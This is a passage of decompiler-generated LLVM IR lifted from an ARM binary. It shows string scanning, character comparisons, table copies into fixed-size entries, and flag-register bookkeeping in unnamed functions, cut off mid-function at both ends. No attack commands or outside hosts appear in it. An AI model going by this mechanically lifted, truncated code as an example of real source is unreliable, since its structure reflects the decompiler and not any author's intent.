  %v2_9ee8 = add i32 %v2_9ee0, %v2_94a0
  store i32 %v2_9ee8, i32* %r3.global-to-local, align 4
  %v1_9eec = load i32, i32* @r6, align 4
  %v2_9eec = add i32 %v1_9eec, %v2_9ee8
  %v3_9eec = inttoptr i32 %v2_9eec to i8*
  %v4_9eec = load i8, i8* %v3_9eec, align 1
  %v6_9eec = zext i8 %v4_9eec to i32
  store i32 %v6_9eec, i32* %r2.global-to-local, align 4
  %v2_9ef0 = icmp ugt i8 %v4_9eec, 31
  store i1 %v2_9ef0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9ef0 = icmp ult i8 %v4_9eec, 32
  store i1 %v6_9ef0, i1* %cpsr_n.global-to-local, align 1
  %v7_9ef0 = icmp eq i8 %v4_9eec, 32
  store i1 %v7_9ef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9ef0, label %bb221, label %bb222

bb221:                                            ; preds = %dec_label_pc_9ec0
  %v2_9ef4 = add i32 %v4_9ed8, 1
  store i32 %v2_9ef4, i32* %r0.global-to-local, align 4
  br label %bb222

bb222:                                            ; preds = %dec_label_pc_9ec0, %bb221
  %v2_9f04 = phi i32 [ %v4_9ed8, %dec_label_pc_9ec0 ], [ %v2_9ef4, %bb221 ]
  %v1_9ef8 = load i32, i32* %fp.global-to-local, align 4
  %v2_9ef8 = sub i32 %v1_9ef8, %v0_9ee0
  store i32 %v2_9ef8, i32* %r3.global-to-local, align 4
  %v2_9efc = sub i32 %v2_9ef8, %v2_9f04
  store i32 %v2_9efc, i32* @r7, align 4
  %v0_9f00 = load i32, i32* @r4, align 4
  %v2_9f00 = add i32 %v0_9f00, %v2_9f04
  store i32 %v2_9f00, i32* @r6, align 4
  br i1 %v7_9ef0, label %bb223, label %bb224

bb223:                                            ; preds = %bb222
  %v3_9f04 = add i32 %v2_9f04, %v0_9ee0
  store i32 %v3_9f04, i32* @sl, align 4
  br label %bb224

bb224:                                            ; preds = %bb222, %bb223
  store i32 %v2_9efc, i32* %r1.global-to-local, align 4
  store i32 %v2_9f00, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9f18 = call i32 @function_146d0(i32 %v2_9f00, i32 %v2_9efc, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32 2)
  store i32 %v5_9f18, i32* %r0.global-to-local, align 4
  %v1_9f1c = add i32 %v5_9f18, 1
  %v2_9f1c = icmp eq i32 %v5_9f18, -1
  store i1 %v2_9f1c, i1* %cpsr_c.global-to-local, align 1
  %v3_9f1c = sub i32 0, %v5_9f18
  %v4_9f1c = and i32 %v1_9f1c, %v3_9f1c
  %v5_9f1c = icmp slt i32 %v4_9f1c, 0
  store i1 %v5_9f1c, i1* %cpsr_v.global-to-local, align 1
  %v6_9f1c = icmp slt i32 %v1_9f1c, 0
  store i1 %v6_9f1c, i1* %cpsr_n.global-to-local, align 1
  %v7_9f1c = icmp eq i32 %v1_9f1c, 0
  store i1 %v7_9f1c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9f18, i32* @r4, align 4
  br i1 %v7_9f1c, label %dec_label_pc_9fd4, label %dec_label_pc_9f28

dec_label_pc_9f28:                                ; preds = %bb224
  store i32 %v2_8fd8, i32* %r2.global-to-local, align 4
  %v1_9f2c = add i32 %v5_9f18, -1
  %v2_9f2c = icmp ne i32 %v5_9f18, 0
  store i1 %v2_9f2c, i1* %cpsr_c.global-to-local, align 1
  %v3_9f2c = sub i32 0, %v5_9f18
  %v4_9f2c = and i32 %v5_9f18, %v3_9f2c
  %v5_9f2c = icmp slt i32 %v4_9f2c, 0
  store i1 %v5_9f2c, i1* %cpsr_v.global-to-local, align 1
  %v6_9f2c = icmp slt i32 %v1_9f2c, 0
  store i1 %v6_9f2c, i1* %cpsr_n.global-to-local, align 1
  %v7_9f2c = icmp eq i32 %v5_9f18, 1
  store i1 %v7_9f2c, i1* %cpsr_z.global-to-local, align 1
  %v7_9f30 = icmp slt i32 %v5_9f18, 2
  br i1 %v7_9f30, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_9f28
  %v9_9f30 = add i32 %v5_9f18, -2
  store i32 %v9_9f30, i32* @r4, align 4
  br label %bb226

bb226:                                            ; preds = %dec_label_pc_9f28, %bb225
  %v1_9f34 = load i32, i32* @sl, align 4
  %v2_9f34 = add i32 %v1_9f34, %v2_8fd8
  store i32 %v2_9f34, i32* @r5, align 4
  %v0_9f38 = load i32, i32* @r6, align 4
  store i32 %v0_9f38, i32* %r0.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r7, align 4
  store i32 %v0_9f3c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14f8c.96 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9f48 = call i32 @function_146d0(i32 %v0_9f38, i32 %v0_9f3c, i32 ptrtoint (i32* @global_var_14f8c.96 to i32), i32 1)
  store i32 %v4_9f48, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9f4c = icmp slt i32 %v4_9f48, 0
  store i1 %v1_9f4c, i1* %cpsr_n.global-to-local, align 1
  %v2_9f4c = icmp eq i32 %v4_9f48, 0
  store i1 %v2_9f4c, i1* %cpsr_z.global-to-local, align 1
  %tmp227 = icmp slt i32 %v4_9f48, 1
  br i1 %tmp227, label %.dec_label_pc_9f6c_crit_edge, label %dec_label_pc_9f54

.dec_label_pc_9f6c_crit_edge:                     ; preds = %bb226
  %v1_9f74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9f6c

dec_label_pc_9f54:                                ; preds = %bb226
  %v0_9f54 = load i32, i32* @r6, align 4
  store i32 %v0_9f54, i32* %r0.global-to-local, align 4
  %v0_9f58 = load i32, i32* @r7, align 4
  store i32 %v0_9f58, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14f8c.96 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9f64 = call i32 @function_146d0(i32 %v0_9f54, i32 %v0_9f58, i32 ptrtoint (i32* @global_var_14f8c.96 to i32), i32 1)
  store i32 %v4_9f64, i32* %r0.global-to-local, align 4
  %v1_9f68 = add i32 %v4_9f64, -1
  store i32 %v1_9f68, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9f6c

dec_label_pc_9f6c:                                ; preds = %.dec_label_pc_9f6c_crit_edge, %dec_label_pc_9f54
  %v1_9f74 = phi i32 [ %v1_9f74.pre, %.dec_label_pc_9f6c_crit_edge ], [ %v1_9f68, %dec_label_pc_9f54 ]
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v1_9f7c = add i32 %v2_9f74, %v1_9f74
  store i32 %v1_9f7c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_9f8c = load i32, i32* @sl, align 4
  %v4_9f8c = add i32 %v3_9f8c, %v1_9f7c
  %v5_9f8c = inttoptr i32 %v4_9f8c to i8*
  store i8 0, i8* %v5_9f8c, align 1
  %storemerge4.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_9fac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9fac

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9fac
  br i1 %v7_9f9c, label %dec_label_pc_9fdc, label %dec_label_pc_9fa4

dec_label_pc_9fa4:                                ; preds = %dec_label_pc_9f98
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9fac

dec_label_pc_9fac:                                ; preds = %dec_label_pc_9f6c, %dec_label_pc_9fa4
  %v0_9fac = phi i32 [ %v0_9f98, %dec_label_pc_9fa4 ], [ %v0_9fac.pre, %dec_label_pc_9f6c ]
  %storemerge4 = phi i32 [ %v1_9fc0, %dec_label_pc_9fa4 ], [ %storemerge4.pre, %dec_label_pc_9f6c ]
  store i32 %storemerge4, i32* %stack_var_-40, align 4
  store i32 %v0_9fac, i32* %r0.global-to-local, align 4
  %v1_9fb0 = inttoptr i32 %v0_9fac to i8*
  %v2_9fb0 = call i32 @function_1460c(i8* %v1_9fb0)
  store i32 %v2_9fb0, i32* %r0.global-to-local, align 4
  %v3_9fb8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9fb8, i32* %r4.global-to-local, align 4
  %v2_9fbc = sub i32 %v2_9fb0, %v3_9fb8
  %v3_9fbc = icmp uge i32 %v2_9fb0, %v3_9fb8
  store i1 %v3_9fbc, i1* %cpsr_c.global-to-local, align 1
  %v4_9fbc = xor i32 %v3_9fb8, %v2_9fb0
  %v5_9fbc = xor i32 %v2_9fbc, %v2_9fb0
  %v6_9fbc = and i32 %v5_9fbc, %v4_9fbc
  %v7_9fbc = icmp slt i32 %v6_9fbc, 0
  store i1 %v7_9fbc, i1* %cpsr_v.global-to-local, align 1
  %v8_9fbc = icmp slt i32 %v2_9fbc, 0
  store i1 %v8_9fbc, i1* %cpsr_n.global-to-local, align 1
  %v9_9fbc = icmp eq i32 %v2_9fb0, %v3_9fb8
  store i1 %v9_9fbc, i1* %cpsr_z.global-to-local, align 1
  %v1_9fc0 = add i32 %v3_9fb8, 1
  store i32 %v1_9fc0, i32* %ip.global-to-local, align 4
  %v8_9fc4 = icmp sgt i32 %v2_9fb0, %v3_9fb8
  %v0_9f98 = load i32, i32* @r5, align 4
  %v2_9f98 = add i32 %v0_9f98, %v3_9fb8
  %v3_9f98 = inttoptr i32 %v2_9f98 to i8*
  %v4_9f98 = load i8, i8* %v3_9f98, align 1
  %v6_9f98 = zext i8 %v4_9f98 to i32
  store i32 %v6_9f98, i32* %r3.global-to-local, align 4
  %v2_9f9c = icmp ugt i8 %v4_9f98, 60
  store i1 %v2_9f9c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9f9c = icmp ult i8 %v4_9f98, 61
  store i1 %v6_9f9c, i1* %cpsr_n.global-to-local, align 1
  %v7_9f9c = icmp eq i8 %v4_9f98, 61
  store i1 %v7_9f9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_9fc4, label %dec_label_pc_9f98, label %dec_label_pc_9fc8

dec_label_pc_9fc8:                                ; preds = %dec_label_pc_9fac
  br i1 %v7_9f9c, label %dec_label_pc_9fdc, label %dec_label_pc_9fd4

dec_label_pc_9fd4:                                ; preds = %dec_label_pc_a020, %dec_label_pc_a044, %dec_label_pc_9fc8, %bb224
  %v0_9fd4 = load i32, i32* @sl, align 4
  store i32 %v0_9fd4, i32* @r5, align 4
  br label %dec_label_pc_9e80

dec_label_pc_9fdc:                                ; preds = %dec_label_pc_9f98, %dec_label_pc_9fc8
  %v0_9fdc = load i32, i32* @r8, align 4
  %v1_9fdc = add i32 %v0_9fdc, 12
  %v2_9fdc = inttoptr i32 %v1_9fdc to i32*
  %v3_9fdc = load i32, i32* %v2_9fdc, align 4
  store i32 %v3_9fdc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9fe8 = icmp slt i32 %v3_9fdc, 0
  store i1 %v1_9fe8, i1* %cpsr_n.global-to-local, align 1
  %v2_9fe8 = icmp eq i32 %v3_9fdc, 0
  store i1 %v2_9fe8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp228 = icmp slt i32 %v3_9fdc, 1
  br i1 %tmp228, label %dec_label_pc_a044, label %dec_label_pc_9ff4

dec_label_pc_9ff4:                                ; preds = %dec_label_pc_9fdc
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a020

dec_label_pc_9ffc:                                ; preds = %dec_label_pc_a020
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_a000 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a000, i32* %r3.global-to-local, align 4
  %v0_a004 = load i32, i32* @r8, align 4
  %v1_a004 = add i32 %v0_a004, 12
  %v2_a004 = inttoptr i32 %v1_a004 to i32*
  %v3_a004 = load i32, i32* %v2_a004, align 4
  %v1_a008 = add i32 %v3_a000, 1
  store i32 %v1_a008, i32* %ip.global-to-local, align 4
  %v2_a00c = sub i32 %v3_a004, %v1_a008
  %v3_a00c = icmp uge i32 %v3_a004, %v1_a008
  store i1 %v3_a00c, i1* %cpsr_c.global-to-local, align 1
  %v4_a00c = xor i32 %v3_a004, %v1_a008
  %v5_a00c = xor i32 %v2_a00c, %v3_a004
  %v6_a00c = and i32 %v5_a00c, %v4_a00c
  %v7_a00c = icmp slt i32 %v6_a00c, 0
  store i1 %v7_a00c, i1* %cpsr_v.global-to-local, align 1
  %v8_a00c = icmp slt i32 %v2_a00c, 0
  store i1 %v8_a00c, i1* %cpsr_n.global-to-local, align 1
  %v9_a00c = icmp eq i32 %v3_a004, %v1_a008
  store i1 %v9_a00c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  store i32 %v1_a008, i32* %r1.global-to-local, align 4
  store i32 %v1_a008, i32* %stack_var_-40, align 4
  %v7_a01c = icmp sgt i32 %v3_a004, %v1_a008
  %v0_a02c.pre = load i32, i32* @r5, align 4
  br i1 %v7_a01c, label %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge, label %dec_label_pc_a044

dec_label_pc_9ffc.dec_label_pc_a020_crit_edge:    ; preds = %dec_label_pc_9ffc
  %v0_a030.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a020

dec_label_pc_a020:                                ; preds = %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge, %dec_label_pc_9ff4
  %v0_a030 = phi i32 [ %v0_a030.pre, %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge ], [ %v3_9fb8, %dec_label_pc_9ff4 ]
  %v0_a02c = phi i32 [ %v0_a02c.pre, %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge ], [ %v0_9f98, %dec_label_pc_9ff4 ]
  %v0_a020 = phi i32 [ %v1_a008, %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge ], [ 0, %dec_label_pc_9ff4 ]
  %v1_a020 = and i32 %v0_a020, 33554432
  %v2_a020 = icmp ne i32 %v1_a020, 0
  store i1 %v2_a020, i1* %cpsr_c.global-to-local, align 1
  %v3_a020 = mul i32 %v0_a020, 128
  %v1_a024 = add i32 %v3_a020, 1472
  %v0_a028 = load i32, i32* %sb.global-to-local, align 4
  %v2_a028 = add i32 %v1_a024, %v0_a028
  store i32 %v2_a028, i32* %r1.global-to-local, align 4
  store i32 %v0_a02c, i32* %r0.global-to-local, align 4
  store i32 %v0_a030, i32* %r2.global-to-local, align 4
  %v3_a034 = inttoptr i32 %v0_a02c to i8*
  %v4_a034 = call i32 @function_14a70(i8* %v3_a034, i32 %v2_a028, i32 %v0_a030)
  store i32 %v4_a034, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a038 = icmp slt i32 %v4_a034, 0
  store i1 %v1_a038, i1* %cpsr_n.global-to-local, align 1
  %v2_a038 = icmp eq i32 %v4_a034, 0
  store i1 %v2_a038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a038, label %dec_label_pc_9ffc, label %dec_label_pc_9fd4

dec_label_pc_a044:                                ; preds = %dec_label_pc_9ffc, %dec_label_pc_9fdc
  %v0_a044 = phi i32 [ %v0_9f98, %dec_label_pc_9fdc ], [ %v0_a02c.pre, %dec_label_pc_9ffc ]
  store i32 %v0_a044, i32* %r0.global-to-local, align 4
  %v1_a048 = inttoptr i32 %v0_a044 to i8*
  %v2_a048 = call i32 @function_1460c(i8* %v1_a048)
  store i32 %v2_a048, i32* %r0.global-to-local, align 4
  %v1_a04c = add i32 %v2_a048, -127
  %v2_a04c = icmp ugt i32 %v2_a048, 126
  store i1 %v2_a04c, i1* %cpsr_c.global-to-local, align 1
  %v3_a04c = sub i32 126, %v2_a048
  %v4_a04c = and i32 %v3_a04c, %v2_a048
  %v5_a04c = icmp slt i32 %v4_a04c, 0
  store i1 %v5_a04c, i1* %cpsr_v.global-to-local, align 1
  %v6_a04c = icmp slt i32 %v1_a04c, 0
  store i1 %v6_a04c, i1* %cpsr_n.global-to-local, align 1
  %v7_a04c = icmp eq i32 %v2_a048, 127
  store i1 %v7_a04c, i1* %cpsr_z.global-to-local, align 1
  %v8_a050 = icmp sgt i32 %v2_a048, 127
  br i1 %v8_a050, label %dec_label_pc_9fd4, label %dec_label_pc_a054

dec_label_pc_a054:                                ; preds = %dec_label_pc_a044
  %v0_a054 = load i32, i32* @r8, align 4
  %v1_a054 = add i32 %v0_a054, 12
  %v2_a054 = inttoptr i32 %v1_a054 to i32*
  %v3_a054 = load i32, i32* %v2_a054, align 4
  %v1_a058 = and i32 %v3_a054, 33554432
  %v2_a058 = icmp ne i32 %v1_a058, 0
  store i1 %v2_a058, i1* %cpsr_c.global-to-local, align 1
  %v3_a058 = mul i32 %v3_a054, 128
  %v1_a05c = add i32 %v3_a058, 1472
  %v0_a060 = load i32, i32* @r5, align 4
  store i32 %v0_a060, i32* %r1.global-to-local, align 4
  %v0_a064 = load i32, i32* %sb.global-to-local, align 4
  %v2_a064 = add i32 %v1_a05c, %v0_a064
  store i32 %v2_a064, i32* @r0, align 4
  %v2_a068 = inttoptr i32 %v2_a064 to i8*
  %v3_a068 = call i32 @function_14634(i8* %v2_a068, i32 %v0_a060)
  store i32 %v3_a068, i32* %r0.global-to-local, align 4
  %v0_a06c = load i32, i32* @r8, align 4
  %v1_a06c = add i32 %v0_a06c, 12
  %v2_a06c = inttoptr i32 %v1_a06c to i32*
  %v3_a06c = load i32, i32* %v2_a06c, align 4
  %v0_a070 = load i32, i32* @sl, align 4
  store i32 %v0_a070, i32* @r5, align 4
  %v1_a074 = add i32 %v3_a06c, 1
  store i32 %v1_a074, i32* %r3.global-to-local, align 4
  store i32 %v1_a074, i32* %v2_a06c, align 4
  %v1_9e8c.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9e80

dec_label_pc_a080:                                ; preds = %dec_label_pc_9eb4, %dec_label_pc_9e80
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_a088 = call i32 @function_13c04(i32 38, i32* null)
  %v0_a08c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a08c, i32* @r1, align 4
  store i32 %v3_a088, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_a098 = call i32 @function_14960(i8* %tmp199, i32 %v0_a08c, i32 %v3_a088)
  store i32 %v4_a098, i32* %r0.global-to-local, align 4
  %v1_a09c = add i32 %v4_a098, 1
  %v2_a09c = icmp eq i32 %v4_a098, -1
  store i1 %v2_a09c, i1* %cpsr_c.global-to-local, align 1
  %v3_a09c = sub i32 0, %v4_a098
  %v4_a09c = and i32 %v1_a09c, %v3_a09c
  %v5_a09c = icmp slt i32 %v4_a09c, 0
  store i1 %v5_a09c, i1* %cpsr_v.global-to-local, align 1
  %v6_a09c = icmp slt i32 %v1_a09c, 0
  store i1 %v6_a09c, i1* %cpsr_n.global-to-local, align 1
  %v7_a09c = icmp eq i32 %v1_a09c, 0
  store i1 %v7_a09c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a09c, label %dec_label_pc_a3d0, label %dec_label_pc_a0a4

dec_label_pc_a0a4:                                ; preds = %dec_label_pc_a080
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_a0ac = call i32 @function_13c04(i32 38, i32* null)
  %v0_a0b0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a0b0, i32* @r1, align 4
  store i32 %v3_a0ac, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_a0bc = call i32 @function_14960(i8* %tmp199, i32 %v0_a0b0, i32 %v3_a0ac)
  store i32 %v4_a0bc, i32* %r0.global-to-local, align 4
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v2_a0c8 = add i32 %v4_a0bc, %v2_94a0
  store i32 %v2_a0c8, i32* %r3.global-to-local, align 4
  %v1_a0cc = load i32, i32* @r6, align 4
  %v2_a0cc = add i32 %v1_a0cc, %v2_a0c8
  %v3_a0cc = inttoptr i32 %v2_a0cc to i8*
  %v4_a0cc = load i8, i8* %v3_a0cc, align 1
  store i32 %v2_8fd8, i32* %lr.global-to-local, align 4
  %v2_a0d4 = icmp ugt i8 %v4_a0cc, 31
  store i1 %v2_a0d4, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a0d4 = icmp ult i8 %v4_a0cc, 32
  store i1 %v6_a0d4, i1* %cpsr_n.global-to-local, align 1
  %v7_a0d4 = icmp eq i8 %v4_a0cc, 32
  store i1 %v7_a0d4, i1* %cpsr_z.global-to-local, align 1
  %v2_a0dc = zext i1 %v7_a0d4 to i32
  %v2_a0dc.v4_a0bc = add i32 %v2_a0dc, %v4_a0bc
  store i32 %v2_a0dc.v4_a0bc, i32* @r4, align 4
  %v2_a0e0 = add i32 %v2_a0dc.v4_a0bc, %v2_8fd8
  store i32 %v2_a0e0, i32* @r5, align 4
  store i32 %v2_a0e0, i32* %r0.global-to-local, align 4
  %v1_a0e8 = load i32, i32* %fp.global-to-local, align 4
  %v2_a0e8 = sub i32 %v1_a0e8, %v2_a0dc.v4_a0bc
  store i32 %v2_a0e8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_a0f4 = call i32 @function_146d0(i32 %v2_a0e0, i32 %v2_a0e8, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32 2)
  store i32 %v5_a0f4, i32* %r0.global-to-local, align 4
  %v1_a0f8 = add i32 %v5_a0f4, 1
  %v2_a0f8 = icmp eq i32 %v5_a0f4, -1
  store i1 %v2_a0f8, i1* %cpsr_c.global-to-local, align 1
  %v3_a0f8 = sub i32 0, %v5_a0f4
  %v4_a0f8 = and i32 %v1_a0f8, %v3_a0f8
  %v5_a0f8 = icmp slt i32 %v4_a0f8, 0
  store i1 %v5_a0f8, i1* %cpsr_v.global-to-local, align 1
  %v6_a0f8 = icmp slt i32 %v1_a0f8, 0
  store i1 %v6_a0f8, i1* %cpsr_n.global-to-local, align 1
  %v7_a0f8 = icmp eq i32 %v1_a0f8, 0
  store i1 %v7_a0f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_a0f4, i32* %lr.global-to-local, align 4
  br i1 %v7_a0f8, label %dec_label_pc_a3d0, label %dec_label_pc_a104

dec_label_pc_a104:                                ; preds = %dec_label_pc_a0a4
  store i32 %v2_94a0, i32* %r1.global-to-local, align 4
  %v1_a10c = add i32 %v5_a0f4, -1
  %v2_a10c = icmp ne i32 %v5_a0f4, 0
  store i1 %v2_a10c, i1* %cpsr_c.global-to-local, align 1
  %v3_a10c = sub i32 0, %v5_a0f4
  %v4_a10c = and i32 %v5_a0f4, %v3_a10c
  %v5_a10c = icmp slt i32 %v4_a10c, 0
  store i1 %v5_a10c, i1* %cpsr_v.global-to-local, align 1
  %v6_a10c = icmp slt i32 %v1_a10c, 0
  store i1 %v6_a10c, i1* %cpsr_n.global-to-local, align 1
  %v7_a10c = icmp eq i32 %v5_a0f4, 1
  store i1 %v7_a10c, i1* %cpsr_z.global-to-local, align 1
  %v1_a110 = load i32, i32* @r4, align 4
  %v2_a110 = add i32 %v1_a110, %v2_94a0
  store i32 %v2_a110, i32* %ip.global-to-local, align 4
  %v7_a114 = icmp sgt i32 %v5_a0f4, 1
  br i1 %v7_a114, label %bb229, label %bb230

bb229:                                            ; preds = %dec_label_pc_a104
  %v9_a114 = add i32 %v5_a0f4, -2
  store i32 %v9_a114, i32* %lr.global-to-local, align 4
  br label %bb230

bb230:                                            ; preds = %dec_label_pc_a104, %bb229
  %v3_a138 = phi i32 [ %v5_a0f4, %dec_label_pc_a104 ], [ %v9_a114, %bb229 ]
  %v1_a11c = add i32 %v3_a138, 1
  store i32 %v1_a11c, i32* %r6.global-to-local, align 4
  %v1_a120 = add i32 %v2_a110, -20773
  store i32 %v1_a120, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_a128 = load i32, i32* @r5, align 4
  store i32 %v0_a128, i32* %r0.global-to-local, align 4
  store i32 %v1_a11c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14f90.98 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v4_a138 = add i32 %v3_a138, %v1_a120
  %v5_a138 = inttoptr i32 %v4_a138 to i8*
  store i8 0, i8* %v5_a138, align 1
  %v5_a13c = call i32 @function_146d0(i32 %v0_a128, i32 %v1_a11c, i32 ptrtoint ([5 x i8]* @global_var_14f90.98 to i32), i32 4)
  store i32 %v5_a13c, i32* %r0.global-to-local, align 4
  %v1_a140 = add i32 %v5_a13c, -4
  %v2_a140 = icmp ugt i32 %v5_a13c, 3
  store i1 %v2_a140, i1* %cpsr_c.global-to-local, align 1
  %v3_a140 = sub i32 3, %v5_a13c
  %v4_a140 = and i32 %v3_a140, %v5_a13c
  %v5_a140 = icmp slt i32 %v4_a140, 0
  store i1 %v5_a140, i1* %cpsr_v.global-to-local, align 1
  %v6_a140 = icmp slt i32 %v1_a140, 0
  store i1 %v6_a140, i1* %cpsr_n.global-to-local, align 1
  %v7_a140 = icmp eq i32 %v5_a13c, 4
  store i1 %v7_a140, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a140, label %dec_label_pc_a6b8, label %dec_label_pc_a148

dec_label_pc_a148:                                ; preds = %bb230
  store i32 %v2_8fd8, i32* %ip.global-to-local, align 4
  %v1_a14c = load i32, i32* @r4, align 4
  %v2_a14c = add i32 %v1_a14c, %v2_8fd8
  %v3_a14c = inttoptr i32 %v2_a14c to i8*
  %v4_a14c = load i8, i8* %v3_a14c, align 1
  %v6_a14c = zext i8 %v4_a14c to i32
  store i32 %v6_a14c, i32* %r3.global-to-local, align 4
  %v2_a150 = icmp ugt i8 %v4_a14c, 46
  store i1 %v2_a150, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a150 = icmp ult i8 %v4_a14c, 47
  store i1 %v6_a150, i1* %cpsr_n.global-to-local, align 1
  %v7_a150 = icmp eq i8 %v4_a14c, 47
  store i1 %v7_a150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a150, label %dec_label_pc_a8ac, label %dec_label_pc_a158

dec_label_pc_a158:                                ; preds = %dec_label_pc_a204, %dec_label_pc_a7f0, %dec_label_pc_a8dc, %dec_label_pc_a8ac, %dec_label_pc_a788, %dec_label_pc_a76c, %dec_label_pc_a148, %dec_label_pc_a8f8, %dec_label_pc_a7b8
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_a15c = load i32, i32* @r8, align 4
  %v3_a15c = add i32 %v2_a15c, -1452
  %v4_a15c = inttoptr i32 %v3_a15c to i8*
  store i8 1, i8* %v4_a15c, align 1
  br label %dec_label_pc_9590

dec_label_pc_a164:                                ; preds = %dec_label_pc_9580
  %v0_a164 = call i32 @___errno_location()
  store i32 %v0_a164, i32* %r0.global-to-local, align 4
  %v0_a168 = load i32, i32* %sb.global-to-local, align 4
  %v1_a168 = add i32 %v0_a168, 1472
  store i32 %v1_a168, i32* %r3.global-to-local, align 4
  %v0_a170 = load i32, i32* @r8, align 4
  %v1_a170 = add i32 %v0_a170, 656
  %v2_a170 = inttoptr i32 %v1_a170 to i32*
  %v3_a170 = load i32, i32* %v2_a170, align 4
  store i32 %v3_a170, i32* %r3.global-to-local, align 4
  %v1_a178 = add i32 %v3_a170, -1024
  %v2_a178 = icmp ugt i32 %v3_a170, 1023
  store i1 %v2_a178, i1* %cpsr_c.global-to-local, align 1
  %v3_a178 = sub i32 1023, %v3_a170
  %v4_a178 = and i32 %v3_a178, %v3_a170
  %v5_a178 = icmp slt i32 %v4_a178, 0
  store i1 %v5_a178, i1* %cpsr_v.global-to-local, align 1
  %v6_a178 = icmp slt i32 %v1_a178, 0
  store i1 %v6_a178, i1* %cpsr_n.global-to-local, align 1
  %v7_a178 = icmp eq i32 %v3_a170, 1024
  store i1 %v7_a178, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_a164, i32* %fp.global-to-local, align 4
  %v1_a180 = add i32 %v0_a168, 2116
  store i32 %v1_a180, i32* @r7, align 4
  br i1 %v7_a178, label %dec_label_pc_a280, label %dec_label_pc_a188

dec_label_pc_a188:                                ; preds = %dec_label_pc_a164, %dec_label_pc_a280, %dec_label_pc_a274
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_a18c = load i32, i32* %fp.global-to-local, align 4
  %v2_a18c = inttoptr i32 %v1_a18c to i32*
  store i32 0, i32* %v2_a18c, align 4
  %v0_a190 = load i32, i32* @r8, align 4
  %v1_a190 = add i32 %v0_a190, 656
  %v2_a190 = inttoptr i32 %v1_a190 to i32*
